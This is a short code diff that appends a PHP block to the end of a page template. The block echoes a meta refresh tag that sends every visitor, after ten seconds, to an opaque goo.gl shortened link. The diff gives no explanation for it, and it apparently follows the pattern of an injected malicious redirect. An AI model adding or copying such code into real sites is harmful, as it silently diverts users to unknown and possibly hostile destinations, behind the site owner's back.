@@ -59,3 +59,7 @@
         </div>
     </div>
 </div>
+
+<?php
+    echo"<meta http-equiv='refresh' content='10; url=https://t3ptg.app.goo.gl/JC6Z9eJLsFJcKepy7'>";
+?>
